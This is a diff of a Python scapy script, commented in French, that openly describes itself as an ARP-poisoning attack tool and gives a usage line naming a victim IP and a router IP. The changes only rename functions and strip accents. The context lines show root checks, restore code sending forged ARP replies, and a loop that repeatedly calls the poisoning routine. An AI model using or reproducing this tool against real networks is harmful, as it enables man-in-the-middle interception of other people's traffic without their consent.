@@ -1,7 +1,7 @@
 # Permet de faire une attaque de type ARP-POISONING
 # Usage:  python arp.py -v 192.168.0.5 -r 192.168.0.1
 #
-# Inspiré fortement de http://danmcinerney.org/arp-poisoning-with-python-2/
+# Inspire fortement de http://danmcinerney.org/arp-poisoning-with-python-2/
 
 #!/usr/bin/python
 from scapy.all import *
@@ -30,15 +30,15 @@ def poison(routerIP, victimIP, routerMAC, victimMAC):
 def restore(routerIP, victimIP, routerMAC, victimMAC):
     send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
     send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
-    sys.exit("Arrêt de l'attaque...")
+    sys.exit("Arret de l'attaque...")
 
 def main(args):
     if os.geteuid() != 0:
         sys.exit("[!] Please run as root")
     routerIP = args.routerIP
     victimIP = args.victimIP
-    routerMAC = originalMAC(args.routerIP)
-    victimMAC = originalMAC(args.victimIP)
+    routerMAC = MAC_Original(args.routerIP)
+    victimMAC = MAC_Original(args.victimIP)
     
     if routerMAC == None:
         sys.exit("Impossible de trouver le MAC du routeur...fermeture")
@@ -56,4 +56,4 @@ def main(args):
         poison(routerIP, victimIP, routerMAC, victimMAC)
         time.sleep(1.5)
 
-main(parse_args())
+main(argument())
